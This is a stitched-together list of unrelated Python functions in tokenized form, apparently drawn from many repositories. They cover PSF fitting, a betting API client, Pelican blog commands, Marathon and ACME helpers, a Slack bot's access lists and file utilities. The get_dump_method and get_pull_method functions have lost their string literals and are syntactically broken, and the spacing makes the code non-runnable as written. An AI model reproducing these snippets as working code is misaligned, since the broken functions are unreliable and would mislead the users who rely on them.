def _translate_particles ( s , max_mem = 1e9 , desc = '' , min_rad = 'calc' , max_rad = 'calc' , invert = 'guess' , rz_order = 0 , do_polish = True ) : if desc is not None : desc_trans = desc + 'translate-particles' desc_burn = desc + 'addsub_burn' desc_polish = desc + 'addsub_polish' else : desc_trans , desc_burn , desc_polish = [ None ] * 3 RLOG . info ( 'Translate Particles:' ) opt . burn ( s , mode = 'do-particles' , n_loop = 4 , fractol = 0.1 , desc = desc_trans , max_mem = max_mem , include_rad = False , dowarn = False ) opt . burn ( s , mode = 'do-particles' , n_loop = 4 , fractol = 0.05 , desc = desc_trans , max_mem = max_mem , include_rad = True , dowarn = False ) RLOG . info ( 'Start add-subtract' ) addsub . add_subtract ( s , tries = 30 , min_rad = min_rad , max_rad = max_rad , invert = invert ) if desc is not None : states . save ( s , desc = desc + 'translate-addsub' ) if do_polish : RLOG . info ( 'Final Burn:' ) opt . burn ( s , mode = 'burn' , n_loop = 3 , fractol = 3e-4 , desc = desc_burn , max_mem = max_mem , rz_order = rz_order , dowarn = False ) RLOG . info ( 'Final Polish:' ) d = opt . burn ( s , mode = 'polish' , n_loop = 4 , fractol = 3e-4 , desc = desc_polish , max_mem = max_mem , rz_order = rz_order , dowarn = False ) if not d [ 'converged' ] : RLOG . warn ( 'Optimization did not converge; consider re-running' )
def link_zscale ( st ) : # FIXME should be made more generic to other parameters and categories psf = st . get ( 'psf' ) psf . param_dict [ 'zscale' ] = psf . param_dict [ 'psf-zscale' ] psf . params [ psf . params . index ( 'psf-zscale' ) ] = 'zscale' psf . global_zscale = True psf . param_dict . pop ( 'psf-zscale' ) st . trigger_parameter_change ( ) st . reset ( )
def _check_for_inception ( self , root_dict ) : for key in root_dict : if isinstance ( root_dict [ key ] , dict ) : root_dict [ key ] = ResponseObject ( root_dict [ key ] ) return root_dict
def _barnes ( self , pos ) : b_in = self . b_in dist = lambda x : np . sqrt ( np . dot ( x , x ) ) #we take a filter size as the max distance between the grids along #x or y: sz = self . npts [ 1 ] coeffs = self . get_values ( self . barnes_params ) b = BarnesInterpolationND ( b_in , coeffs , filter_size = self . filtsize , damp = 0.9 , iterations = 3 , clip = self . local_updates , clipsize = self . barnes_clip_size , blocksize = 100 # FIXME magic blocksize ) return b ( pos )
def schedules ( self , schedules ) : url = PATHS [ 'UPDATE_SCHEDULES' ] % self . id data_format = "schedules[0][%s][]=%s&" post_data = "" for format_type , values in schedules . iteritems ( ) : for value in values : post_data += data_format % ( format_type , value ) self . api . post ( url = url , data = post_data )
def moment ( p , v , order = 1 ) : if order == 1 : return ( v * p ) . sum ( ) elif order == 2 : return np . sqrt ( ( ( v ** 2 ) * p ) . sum ( ) - ( v * p ) . sum ( ) ** 2 )
def _tz ( self , z ) : return ( z - self . param_dict [ 'psf-zslab' ] ) * self . param_dict [ self . zscale ]
def characterize_psf ( self ) : # there may be an issue with the support and characterization-- # it might be best to do the characterization with the same support # as the calculated psf. l , u = max ( self . zrange [ 0 ] , self . param_dict [ 'psf-zslab' ] ) , self . zrange [ 1 ] size_l , drift_l = self . measure_size_drift ( l ) size_u , drift_u = self . measure_size_drift ( u ) # must be odd for now or have a better system for getting the center self . support = util . oddify ( 2 * self . support_factor * size_u . astype ( 'int' ) ) self . drift_poly = np . polyfit ( [ l , u ] , [ drift_l , drift_u ] , 1 ) if self . cutoffval is not None : psf , vec , size_l = self . psf_slice ( l , size = 51 , zoffset = drift_l , getextent = True ) psf , vec , size_u = self . psf_slice ( u , size = 51 , zoffset = drift_u , getextent = True ) ss = [ np . abs ( i ) . sum ( axis = - 1 ) for i in [ size_l , size_u ] ] self . support = util . oddify ( util . amax ( * ss ) )
def psffunc ( self , * args , * * kwargs ) : if self . polychromatic : func = psfcalc . calculate_polychrome_linescan_psf else : func = psfcalc . calculate_linescan_psf return func ( * args , * * kwargs )
def psffunc ( self , x , y , z , * * kwargs ) : #do_pinhole?? FIXME if self . polychromatic : func = psfcalc . calculate_polychrome_pinhole_psf else : func = psfcalc . calculate_pinhole_psf x0 , y0 = [ psfcalc . vec_to_halfvec ( v ) for v in [ x , y ] ] vls = psfcalc . wrap_and_calc_psf ( x0 , y0 , z , func , * * kwargs ) return vls / vls . sum ( )
def characterize_psf ( self ) : l , u = max ( self . zrange [ 0 ] , self . param_dict [ 'psf-zslab' ] ) , self . zrange [ 1 ] size_l , drift_l = self . measure_size_drift ( l , size = self . support ) size_u , drift_u = self . measure_size_drift ( u , size = self . support ) self . drift_poly = np . polyfit ( [ l , u ] , [ drift_l , drift_u ] , 1 )
def _req ( self , url , method = 'GET' , * * kw ) : send = requests . post if method == 'POST' else requests . get try : r = send ( url , headers = self . _token_header ( ) , timeout = self . settings [ 'timeout' ] , * * kw ) except requests . exceptions . Timeout : raise ApiError ( 'Request timed out (%s seconds)' % self . settings [ 'timeout' ] ) try : json = r . json ( ) except ValueError : raise ApiError ( 'Received not JSON response from API' ) if json . get ( 'status' ) != 'ok' : raise ApiError ( 'API error: received unexpected json from API: %s' % json ) return json
def get_active_bets ( self , project_id = None ) : url = urljoin ( self . settings [ 'bets_url' ] , 'bets?state=fresh,active,accept_end&page=1&page_size=100' ) if project_id is not None : url += '&kava_project_id={}' . format ( project_id ) bets = [ ] has_next_page = True while has_next_page : res = self . _req ( url ) bets . extend ( res [ 'bets' ] [ 'results' ] ) url = res [ 'bets' ] . get ( 'next' ) has_next_page = bool ( url ) return bets
def subscribe ( self , event , bet_ids ) : if not self . _subscriptions . get ( event ) : self . _subscriptions [ event ] = set ( ) self . _subscriptions [ event ] = self . _subscriptions [ event ] . union ( bet_ids )
def preview ( context ) : config = context . obj pelican ( config , '--verbose' , '--ignore-cache' ) server_proc = None os . chdir ( config [ 'OUTPUT_DIR' ] ) try : try : command = 'python -m http.server ' + str ( PORT ) server_proc = run ( command , bg = True ) time . sleep ( 3 ) click . launch ( 'http://localhost:8000' ) time . sleep ( 5 ) pelican ( config , '--autoreload' ) except Exception : if server_proc is not None : server_proc . kill ( ) raise except KeyboardInterrupt : abort ( context )
def write ( context ) : config = context . obj title = click . prompt ( 'Title' ) author = click . prompt ( 'Author' , default = config . get ( 'DEFAULT_AUTHOR' ) ) slug = slugify ( title ) creation_date = datetime . now ( ) basename = '{:%Y-%m-%d}_{}.md' . format ( creation_date , slug ) meta = ( ( 'Title' , title ) , ( 'Date' , '{:%Y-%m-%d %H:%M}:00' . format ( creation_date ) ) , ( 'Modified' , '{:%Y-%m-%d %H:%M}:00' . format ( creation_date ) ) , ( 'Author' , author ) , ) file_content = '' for key , value in meta : file_content += '{}: {}\n' . format ( key , value ) file_content += '\n\n' file_content += 'Text...\n\n' file_content += '![image description]({filename}/images/my-photo.jpg)\n\n' file_content += 'Text...\n\n' os . makedirs ( config [ 'CONTENT_DIR' ] , exist_ok = True ) path = os . path . join ( config [ 'CONTENT_DIR' ] , basename ) with click . open_file ( path , 'w' ) as f : f . write ( file_content ) click . echo ( path ) click . launch ( path )
def lint ( context ) : config = context . obj try : run ( 'flake8 {dir} --exclude={exclude}' . format ( dir = config [ 'CWD' ] , exclude = ',' . join ( EXCLUDE ) , ) ) except SubprocessError : context . exit ( 1 )
def publish ( context ) : header ( 'Recording changes...' ) run ( 'git add -A' ) header ( 'Displaying changes...' ) run ( 'git -c color.status=always status' ) if not click . confirm ( '\nContinue publishing' ) : run ( 'git reset HEAD --' ) abort ( context ) header ( 'Saving changes...' ) try : run ( 'git commit -m "{message}"' . format ( message = 'Publishing {}' . format ( choose_commit_emoji ( ) ) ) , capture = True ) except subprocess . CalledProcessError as e : if 'nothing to commit' not in e . stdout : raise else : click . echo ( 'Nothing to commit.' ) header ( 'Pushing to GitHub...' ) branch = get_branch ( ) run ( 'git push origin {branch}:{branch}' . format ( branch = branch ) ) pr_link = get_pr_link ( branch ) if pr_link : click . launch ( pr_link )
def deploy ( context ) : config = context . obj header ( 'Generating HTML...' ) pelican ( config , '--verbose' , production = True ) header ( 'Removing unnecessary output...' ) unnecessary_paths = [ 'author' , 'category' , 'tag' , 'feeds' , 'tags.html' , 'authors.html' , 'categories.html' , 'archives.html' , ] for path in unnecessary_paths : remove_path ( os . path . join ( config [ 'OUTPUT_DIR' ] , path ) ) if os . environ . get ( 'TRAVIS' ) : # Travis CI header ( 'Setting up Git...' ) run ( 'git config user.name ' + run ( 'git show --format="%cN" -s' , capture = True ) ) run ( 'git config user.email ' + run ( 'git show --format="%cE" -s' , capture = True ) ) github_token = os . environ . get ( 'GITHUB_TOKEN' ) repo_slug = os . environ . get ( 'TRAVIS_REPO_SLUG' ) origin = 'https://{}@github.com/{}.git' . format ( github_token , repo_slug ) run ( 'git remote set-url origin ' + origin ) header ( 'Rewriting gh-pages branch...' ) run ( 'ghp-import -m "{message}" {dir}' . format ( message = 'Deploying {}' . format ( choose_commit_emoji ( ) ) , dir = config [ 'OUTPUT_DIR' ] , ) ) header ( 'Pushing to GitHub...' ) run ( 'git push origin gh-pages:gh-pages --force' )
def signed_number ( number , precision = 2 ) : prefix = '' if number <= 0 else '+' number_str = '{}{:.{precision}f}' . format ( prefix , number , precision = precision ) return number_str
def show_response_messages ( response_json ) : message_type_kwargs = { 'warning' : { 'fg' : 'yellow' } , 'error' : { 'fg' : 'red' } , } for message in response_json . get ( 'messages' , [ ] ) : click . secho ( message [ 'text' ] , * * message_type_kwargs . get ( message [ 'type' ] , { } ) )
def photos ( context , path ) : config = context . obj header ( 'Looking for the latest article...' ) article_filename = find_last_article ( config [ 'CONTENT_DIR' ] ) if not article_filename : return click . secho ( 'No articles.' , fg = 'red' ) click . echo ( os . path . basename ( article_filename ) ) header ( 'Looking for images...' ) images = list ( sorted ( find_images ( path ) ) ) if not images : return click . secho ( 'Found no images.' , fg = 'red' ) for filename in images : click . secho ( filename , fg = 'green' ) if not click . confirm ( '\nAdd these images to the latest article' ) : abort ( config ) url_prefix = os . path . join ( '{filename}' , IMAGES_PATH ) images_dir = os . path . join ( config [ 'CONTENT_DIR' ] , IMAGES_PATH ) os . makedirs ( images_dir , exist_ok = True ) header ( 'Processing images...' ) urls = [ ] for filename in images : image_basename = os . path . basename ( filename ) . replace ( ' ' , '-' ) . lower ( ) urls . append ( os . path . join ( url_prefix , image_basename ) ) image_filename = os . path . join ( images_dir , image_basename ) print ( filename , image_filename ) import_image ( filename , image_filename ) content = '\n' for url in urls : url = url . replace ( '\\' , '/' ) content += '\n![image description]({})\n' . format ( url ) header ( 'Adding to article: {}' . format ( article_filename ) ) with click . open_file ( article_filename , 'a' ) as f : f . write ( content ) click . launch ( article_filename )
def _generate_circle ( self ) : total_weight = 0 for node in self . nodes : total_weight += self . weights . get ( node , 1 ) for node in self . nodes : weight = 1 if node in self . weights : weight = self . weights . get ( node ) factor = math . floor ( ( 40 * len ( self . nodes ) * weight ) / total_weight ) for j in range ( 0 , int ( factor ) ) : b_key = bytearray ( self . _hash_digest ( '%s-%s' % ( node , j ) ) ) for i in range ( 0 , 3 ) : key = self . _hash_val ( b_key , lambda x : x + i * 4 ) self . ring [ key ] = node self . _sorted_keys . append ( key ) self . _sorted_keys . sort ( )
def _get_networking_mode ( app ) : # Marathon 1.5+: there is a `networks` field networks = app . get ( 'networks' ) if networks : # Modes cannot be mixed, so assigning the last mode is fine return networks [ - 1 ] . get ( 'mode' , 'container' ) # Older Marathon: determine equivalent network mode container = app . get ( 'container' ) if container is not None and 'docker' in container : docker_network = container [ 'docker' ] . get ( 'network' ) if docker_network == 'USER' : return 'container' elif docker_network == 'BRIDGE' : return 'container/bridge' return 'container' if _is_legacy_ip_per_task ( app ) else 'host'
def _get_container_port_mappings ( app ) : container = app [ 'container' ] # Marathon 1.5+: container.portMappings field port_mappings = container . get ( 'portMappings' ) # Older Marathon: container.docker.portMappings field if port_mappings is None and 'docker' in container : port_mappings = container [ 'docker' ] . get ( 'portMappings' ) return port_mappings
def _request ( self , failure , endpoints , * args , * * kwargs ) : # We've run out of endpoints, fail if not endpoints : return failure endpoint = endpoints . pop ( 0 ) d = super ( MarathonClient , self ) . request ( * args , url = endpoint , * * kwargs ) # If something goes wrong, call ourselves again with the remaining # endpoints d . addErrback ( self . _request , endpoints , * args , * * kwargs ) return d
def read ( self , path , * * params ) : d = self . request ( 'GET' , '/v1/' + path , params = params ) return d . addCallback ( self . _handle_response )
def write ( self , path , * * data ) : d = self . request ( 'PUT' , '/v1/' + path , json = data ) return d . addCallback ( self . _handle_response , check_cas = True )
def _parse_field_value ( line ) : if line . startswith ( ':' ) : # Ignore the line return None , None if ':' not in line : # Treat the entire line as the field, use empty string as value return line , '' # Else field is before the ':' and value is after field , value = line . split ( ':' , 1 ) # If value starts with a space, remove it. value = value [ 1 : ] if value . startswith ( ' ' ) else value return field , value
def _handle_field_value ( self , field , value ) : if field == 'event' : self . _event = value elif field == 'data' : self . _data_lines . append ( value ) elif field == 'id' : # Not implemented pass elif field == 'retry' : # Not implemented pass
def _dispatch_event ( self ) : data = self . _prepare_data ( ) if data is not None : self . _handler ( self . _event , data ) self . _reset_event_data ( )
def _issue_cert ( self , domain ) : def errback ( failure ) : # Don't fail on some of the errors we could get from the ACME # server, rather just log an error so that we can continue with # other domains. failure . trap ( txacme_ServerError ) acme_error = failure . value . message if acme_error . code in [ 'rateLimited' , 'serverInternal' , 'connection' , 'unknownHost' ] : # TODO: Fire off an error to Sentry or something? self . log . error ( 'Error ({code}) issuing certificate for "{domain}": ' '{detail}' , code = acme_error . code , domain = domain , detail = acme_error . detail ) else : # There are more error codes but if they happen then something # serious has gone wrong-- carry on error-ing. return failure d = self . txacme_service . issue_cert ( domain ) return d . addErrback ( errback )
def start ( self ) : self . bot_start_time = datetime . now ( ) self . webserver = Webserver ( self . config [ 'webserver' ] [ 'host' ] , self . config [ 'webserver' ] [ 'port' ] ) self . plugins . load ( ) self . plugins . load_state ( ) self . _find_event_handlers ( ) self . sc = ThreadedSlackClient ( self . config [ 'slack_token' ] ) self . always_send_dm = [ '_unauthorized_' ] if 'always_send_dm' in self . config : self . always_send_dm . extend ( map ( lambda x : '!' + x , self . config [ 'always_send_dm' ] ) ) # Rocket is very noisy at debug logging . getLogger ( 'Rocket.Errors.ThreadPool' ) . setLevel ( logging . INFO ) self . is_setup = True if self . test_mode : self . metrics [ 'startup_time' ] = ( datetime . now ( ) - self . bot_start_time ) . total_seconds ( ) * 1000.0
def stop ( self ) : if self . webserver is not None : self . webserver . stop ( ) if not self . test_mode : self . plugins . save_state ( )
def push ( self , message ) : if self . _ignore_event ( message ) : return None , None args = self . _parse_message ( message ) self . log . debug ( "Searching for command using chunks: %s" , args ) cmd , msg_args = self . _find_longest_prefix_command ( args ) if cmd is not None : if message . user is None : self . log . debug ( "Discarded message with no originating user: %s" , message ) return None , None sender = message . user . username if message . channel is not None : sender = "#%s/%s" % ( message . channel . name , sender ) self . log . info ( "Received from %s: %s, args %s" , sender , cmd , msg_args ) f = self . _get_command ( cmd , message . user ) if f : if self . _is_channel_ignored ( f , message . channel ) : self . log . info ( "Channel %s is ignored, discarding command %s" , message . channel , cmd ) return '_ignored_' , "" return cmd , f . execute ( message , msg_args ) return '_unauthorized_' , "Sorry, you are not authorized to run %s" % cmd return None , None
def acl_show ( self , msg , args ) : name = args [ 0 ] if len ( args ) > 0 else None if name is None : return "%s: The following ACLs are defined: %s" % ( msg . user , ', ' . join ( self . _acl . keys ( ) ) ) if name not in self . _acl : return "Sorry, couldn't find an acl named '%s'" % name return '\n' . join ( [ "%s: ACL '%s' is defined as follows:" % ( msg . user , name ) , "allow: %s" % ', ' . join ( self . _acl [ name ] [ 'allow' ] ) , "deny: %s" % ', ' . join ( self . _acl [ name ] [ 'deny' ] ) ] )
def add_user_to_allow ( self , name , user ) : # Clear user from both allow and deny before adding if not self . remove_user_from_acl ( name , user ) : return False if name not in self . _acl : return False self . _acl [ name ] [ 'allow' ] . append ( user ) return True
def create_acl ( self , name ) : if name in self . _acl : return False self . _acl [ name ] = { 'allow' : [ ] , 'deny' : [ ] } return True
def delete_acl ( self , name ) : if name not in self . _acl : return False del self . _acl [ name ] return True
def mongo ( daemon = False , port = 20771 ) : cmd = "mongod --port {0}" . format ( port ) if daemon : cmd += " --fork" run ( cmd )
def get_by_username ( self , username ) : res = filter ( lambda x : x . username == username , self . users . values ( ) ) if len ( res ) > 0 : return res [ 0 ] return None
def load_user_rights ( self , user ) : if user . username in self . admins : user . is_admin = True elif not hasattr ( user , 'is_admin' ) : user . is_admin = False
def freeze ( value ) : if isinstance ( value , list ) : return FrozenList ( * value ) if isinstance ( value , dict ) : return FrozenDict ( * * value ) return value
def help ( self , msg , args ) : output = [ ] if len ( args ) == 0 : commands = sorted ( self . _bot . dispatcher . commands . items ( ) , key = itemgetter ( 0 ) ) commands = filter ( lambda x : x [ 1 ] . is_subcmd is False , commands ) # Filter commands if auth is enabled, hide_admin_commands is enabled, and user is not admin if self . _should_filter_help_commands ( msg . user ) : commands = filter ( lambda x : x [ 1 ] . admin_only is False , commands ) for name , cmd in commands : output . append ( self . _get_short_help_for_command ( name ) ) else : name = '!' + args [ 0 ] output = [ self . _get_help_for_command ( name ) ] return '\n' . join ( output )
def save ( self , msg , args ) : self . send_message ( msg . channel , "Saving current state..." ) self . _bot . plugins . save_state ( ) self . send_message ( msg . channel , "Done." )
def shutdown ( self , msg , args ) : self . log . info ( "Received shutdown from %s" , msg . user . username ) self . _bot . runnable = False return "Shutting down..."
def whoami ( self , msg , args ) : output = [ "Hello %s" % msg . user ] if hasattr ( self . _bot . dispatcher , 'auth_manager' ) and msg . user . is_admin is True : output . append ( "You are a *bot admin*." ) output . append ( "Bot version: %s-%s" % ( self . _bot . version , self . _bot . commit ) ) return '\n' . join ( output )
def _arg_name ( self , name , types , prefix = "--" ) : if 'type:a10_nullable' in types : return self . _arg_name ( name , types [ 'type:a10_nullable' ] , prefix ) if 'type:a10_list' in types : return self . _arg_name ( name , types [ 'type:a10_list' ] , prefix ) if 'type:a10_reference' in types : if name . endswith ( '_id' ) : name = name [ : - 3 ] return prefix + name . replace ( '_' , '-' )
def _sort_by ( key ) : @ staticmethod def sort_by ( p_list , reverse = False ) : return sorted ( p_list , key = lambda p : getattr ( p , key ) , reverse = reverse , ) return sort_by
def n_file ( self ) : self . assert_is_dir_and_exists ( ) n = 0 for _ in self . select_file ( recursive = True ) : n += 1 return n
def n_dir ( self ) : self . assert_is_dir_and_exists ( ) n = 0 for _ in self . select_dir ( recursive = True ) : n += 1 return n
def acquire_lock ( func ) : @ wraps ( func ) def wrapper ( self , * args , * * kwargs ) : with self . locker as r : # get the result acquired , code , _ = r if acquired : try : r = func ( self , * args , * * kwargs ) except Exception as err : e = str ( err ) else : e = None else : warnings . warn ( "code %s. Unable to aquire the lock when calling '%s'. You may try again!" % ( code , func . __name__ ) ) e = None r = None # raise error after exiting with statement and releasing the lock! if e is not None : traceback . print_stack ( ) raise Exception ( e ) return r return wrapper
def sync_required ( func ) : @ wraps ( func ) def wrapper ( self , * args , * * kwargs ) : if not self . _keepSynchronized : r = func ( self , * args , * * kwargs ) else : state = self . _load_state ( ) #print("----------->  ",state, self.state) if state is None : r = func ( self , * args , * * kwargs ) elif state == self . state : r = func ( self , * args , * * kwargs ) else : warnings . warn ( "Repository at '%s' is out of date. Need to load it again to avoid conflict." % self . path ) r = None return r return wrapper
def get_pickling_errors ( obj , seen = None ) : if seen == None : seen = [ ] if hasattr ( obj , "__getstate__" ) : state = obj . __getstate__ ( ) #elif hasattr(obj, "__dict__"): #    state = obj.__dict__ else : return None #try: #    state = obj.__getstate__() #except AttributeError as e: #    #state = obj.__dict__ #    return str(e) if state == None : return 'object state is None' if isinstance ( state , tuple ) : if not isinstance ( state [ 0 ] , dict ) : state = state [ 1 ] else : state = state [ 0 ] . update ( state [ 1 ] ) result = { } for i in state : try : pickle . dumps ( state [ i ] , protocol = 2 ) except pickle . PicklingError as e : if not state [ i ] in seen : seen . append ( state [ i ] ) result [ i ] = get_pickling_errors ( state [ i ] , seen ) return result
def save ( self ) : # open file repoInfoPath = os . path . join ( self . __path , ".pyrepinfo" ) try : fdinfo = open ( repoInfoPath , 'wb' ) except Exception as e : raise Exception ( "unable to open repository info for saving (%s)" % e ) # save repository try : pickle . dump ( self , fdinfo , protocol = 2 ) except Exception as e : fdinfo . flush ( ) os . fsync ( fdinfo . fileno ( ) ) fdinfo . close ( ) raise Exception ( "Unable to save repository info (%s)" % e ) finally : fdinfo . flush ( ) os . fsync ( fdinfo . fileno ( ) ) fdinfo . close ( ) # save timestamp repoTimePath = os . path . join ( self . __path , ".pyrepstate" ) try : self . __state = ( "%.6f" % time . time ( ) ) . encode ( ) with open ( repoTimePath , 'wb' ) as fdtime : fdtime . write ( self . __state ) fdtime . flush ( ) os . fsync ( fdtime . fileno ( ) ) except Exception as e : raise Exception ( "unable to open repository time stamp for saving (%s)" % e )
def ensure_str ( value ) : if isinstance ( value , six . string_types ) : return value else : return six . text_type ( value )
def stream ( self , report ) : with self . ClientSession ( ) as session : lines = [ ] for job in report [ 'traces' ] : key = '%s:%s' % ( self . name , job ) for minute in report [ 'traces' ] [ job ] : for k , v in report [ 'traces' ] [ job ] [ minute ] . items ( ) : lines . append ( '# TYPE %s_%s gauge' % ( key , k ) ) lines . append ( '%s_%s %0.2f' % ( key , k , v ) ) # Empty is required at the end of the payload lines . append ( "" ) data = "\n" . join ( lines ) logger . info ( data ) yield from session . post ( self . url , data = bytes ( data . encode ( 'utf-8' ) ) )
def stream ( self , report ) : payload = { "agent" : { "host" : report [ 'instance' ] [ 'hostname' ] , "version" : "1.0.0" } , "components" : [ { "name" : self . name , "guid" : "com.darwinmonroy.aiometrics" , "duration" : 60 , "metrics" : { 'Component/{}' . format ( key ) : { "total" : metric [ 'count' ] * metric [ 'avg' ] , "count" : metric [ 'count' ] , "min" : metric [ 'min' ] , "max" : metric [ 'max' ] , "sum_of_squares" : metric [ 'min' ] ** 2 + metric [ 'max' ] ** 2 , } for key , metric in report [ 'traces' ] . items ( ) } } ] } with self . ClientSession ( ) as session : try : r = yield from session . post ( 'https://platform-api.newrelic.com/platform/v1/metrics' , data = json . dumps ( payload ) , headers = ( ( 'X-License-Key' , self . license_key ) , ( 'Content-Type' , 'application/json' ) , ( 'Accept' , 'application/json' ) , ) ) r . close ( ) except Exception as e : # Any exception should affect the execution of the main # program, so we must explicitly silence any error caused by # by the streaming of metrics # TODO: consider the implementation of a retry logic logger . exception ( e )
def stats ( cls , traces ) : data = { } stats = { } # Group traces by key and minute for trace in traces : key = trace [ 'key' ] if key not in data : data [ key ] = [ ] stats [ key ] = { } data [ key ] . append ( trace [ 'total_time' ] ) cls . _traces . pop ( trace [ 'id' ] ) for key in data : times = data [ key ] stats [ key ] = dict ( count = len ( times ) , max = max ( times ) , min = min ( times ) , avg = sum ( times ) / len ( times ) ) return stats
def stop ( self ) : with self . _status_lock : if self . _running : assert self . _observer is not None self . _observer . stop ( ) self . _running = False self . _origin_mapped_data = dict ( )
def tear_down ( self ) : while len ( self . _temp_directories ) > 0 : directory = self . _temp_directories . pop ( ) shutil . rmtree ( directory , ignore_errors = True ) while len ( self . _temp_files ) > 0 : file = self . _temp_files . pop ( ) try : os . remove ( file ) except OSError : pass
def copyto ( self , new_abspath = None , new_dirpath = None , new_dirname = None , new_basename = None , new_fname = None , new_ext = None , overwrite = False , makedirs = False ) : self . assert_exists ( ) p = self . change ( new_abspath = new_abspath , new_dirpath = new_dirpath , new_dirname = new_dirname , new_basename = new_basename , new_fname = new_fname , new_ext = new_ext , ) if p . is_not_exist_or_allow_overwrite ( overwrite = overwrite ) : # , copy if self . abspath != p . abspath : try : shutil . copy ( self . abspath , p . abspath ) except IOError as e : if makedirs : os . makedirs ( p . parent . abspath ) shutil . copy ( self . abspath , p . abspath ) else : raise e return p
def get_dump_method ( dump , protocol = - 1 ) : if dump is None : dump = 'pickle' if dump . startswith ( 'pickle' ) : if dump == 'pickle' : proto = protocol else : proto = dump . strip ( 'pickle' ) try : proto = int ( proto ) assert proto >= - 1 except : raise Exception ( "protocol must be an integer >=-1" ) code = % proto elif dump . startswith ( 'dill' ) : if dump == 'dill' : proto = 2 else : proto = dump . strip ( 'dill' ) try : proto = int ( proto ) assert proto >= - 1 except : raise Exception ( "protocol must be an integer >=-1" ) code = % proto elif dump == 'json' : code = elif dump == 'numpy' : code = elif dump == 'numpy_text' : code = else : assert isinstance ( dump , basestring ) , "dump must be None or a string" assert '$FILE_PATH' in dump , "string dump code must inlcude '$FILE_PATH'" code = dump # return return code
def get_pull_method ( pull ) : if pull is None or pull . startswith ( 'pickle' ) : code = elif pull . startswith ( 'dill' ) : code = elif pull == 'json' : code = elif pull == 'numpy' : code = elif pull == 'numpy_text' : code = else : assert isinstance ( pull , basestring ) , "pull must be None or a string" assert 'PULLED_DATA' in pull , "string pull code must inlcude 'PULLED_DATA'" assert '$FILE_PATH' in pull , "string pull code must inlcude '$FILE_PATH'" code = pull # return return code
def path_required ( func ) : @ wraps ( func ) def wrapper ( self , * args , * * kwargs ) : if self . path is None : warnings . warn ( 'Must load (Repository.load_repository) or initialize (Repository.create_repository) the repository first !' ) return return func ( self , * args , * * kwargs ) return wrapper
def __clean_before_after ( self , stateBefore , stateAfter , keepNoneEmptyDirectory = True ) : # prepare after for faster search errors = [ ] afterDict = { } [ afterDict . setdefault ( list ( aitem ) [ 0 ] , [ ] ) . append ( aitem ) for aitem in stateAfter ] # loop before for bitem in reversed ( stateBefore ) : relaPath = list ( bitem ) [ 0 ] basename = os . path . basename ( relaPath ) btype = bitem [ relaPath ] [ 'type' ] alist = afterDict . get ( relaPath , [ ] ) aitem = [ a for a in alist if a [ relaPath ] [ 'type' ] == btype ] if len ( aitem ) > 1 : errors . append ( "Multiple '%s' of type '%s' where found in '%s', this should never had happened. Please report issue" % ( basename , btype , relaPath ) ) continue if not len ( aitem ) : removeDirs = [ ] removeFiles = [ ] if btype == 'dir' : if not len ( relaPath ) : errors . append ( "Removing main repository directory is not allowed" ) continue removeDirs . append ( os . path . join ( self . __path , relaPath ) ) removeFiles . append ( os . path . join ( self . __path , relaPath , self . __dirInfo ) ) removeFiles . append ( os . path . join ( self . __path , relaPath , self . __dirLock ) ) elif btype == 'file' : removeFiles . append ( os . path . join ( self . __path , relaPath ) ) removeFiles . append ( os . path . join ( self . __path , relaPath , self . __fileInfo % basename ) ) removeFiles . append ( os . path . join ( self . __path , relaPath , self . __fileLock % basename ) ) else : ### MUST VERIFY THAT ONCE pyrepobjectdir IS IMPLEMENTED removeDirs . append ( os . path . join ( self . __path , relaPath ) ) removeFiles . append ( os . path . join ( self . __path , relaPath , self . __fileInfo % basename ) ) # remove files for fpath in removeFiles : if os . path . isfile ( fpath ) : try : os . remove ( fpath ) except Exception as err : errors . append ( "Unable to clean file '%s' (%s)" % ( fpath , str ( err ) ) ) # remove directories for dpath in removeDirs : if os . path . isdir ( dpath ) : if keepNoneEmptyDirectory or not len ( os . listdir ( dpath ) ) : try : shutil . rmtree ( dpath ) except Exception as err : errors . append ( "Unable to clean directory '%s' (%s)" % ( fpath , str ( err ) ) ) # return result and errors list return len ( errors ) == 0 , errors
def reset ( self ) : self . __path = None self . __repo = { 'repository_unique_name' : str ( uuid . uuid1 ( ) ) , 'create_utctime' : time . time ( ) , 'last_update_utctime' : None , 'pyrep_version' : str ( __version__ ) , 'repository_information' : '' , 'walk_repo' : [ ] }
def print_big_dir ( self , top_n = 5 ) : self . assert_is_dir_and_exists ( ) size_table = sorted ( [ ( p , p . dirsize ) for p in self . select_dir ( recursive = False ) ] , key = lambda x : x [ 1 ] , reverse = True , ) for p , size in size_table [ : top_n ] : print ( "{:<9}    {:<9}" . format ( repr_data_size ( size ) , p . abspath ) )
def print_big_file ( self , top_n = 5 ) : self . assert_is_dir_and_exists ( ) size_table = sorted ( [ ( p , p . size ) for p in self . select_file ( recursive = True ) ] , key = lambda x : x [ 1 ] , reverse = True , ) for p , size in size_table [ : top_n ] : print ( "{:<9}    {:<9}" . format ( repr_data_size ( size ) , p . abspath ) )
def print_big_dir_and_big_file ( self , top_n = 5 ) : self . assert_is_dir_and_exists ( ) size_table1 = sorted ( [ ( p , p . dirsize ) for p in self . select_dir ( recursive = False ) ] , key = lambda x : x [ 1 ] , reverse = True , ) for p1 , size1 in size_table1 [ : top_n ] : print ( "{:<9}    {:<9}" . format ( repr_data_size ( size1 ) , p1 . abspath ) ) size_table2 = sorted ( [ ( p , p . size ) for p in p1 . select_file ( recursive = True ) ] , key = lambda x : x [ 1 ] , reverse = True , ) for p2 , size2 in size_table2 [ : top_n ] : print ( "    {:<9}    {:<9}" . format ( repr_data_size ( size2 ) , p2 . abspath ) )
def size ( self ) : try : return self . _stat . st_size except : # pragma: no cover self . _stat = self . stat ( ) return self . size
def mtime ( self ) : try : return self . _stat . st_mtime except : # pragma: no cover self . _stat = self . stat ( ) return self . mtime
def atime ( self ) : try : return self . _stat . st_atime except : # pragma: no cover self . _stat = self . stat ( ) return self . atime
def ctime ( self ) : try : return self . _stat . st_ctime except : # pragma: no cover self . _stat = self . stat ( ) return self . ctime
def keys ( self ) : return self . options . keys ( ) + [ p . name for p in self . positional_args ]
def values ( self ) : return self . options . values ( ) + [ p . value for p in self . positional_args ]
def items ( self ) : return [ ( p . name , p . value ) for p in self . options . values ( ) + self . positional_args ]
def _add_option ( self , option ) : if option . name in self . options : raise ValueError ( 'name already in use' ) if option . abbreviation in self . abbreviations : raise ValueError ( 'abbreviation already in use' ) if option . name in [ arg . name for arg in self . positional_args ] : raise ValueError ( 'name already in use by a positional argument' ) self . options [ option . name ] = option if option . abbreviation : self . abbreviations [ option . abbreviation ] = option self . option_order . append ( option . name )
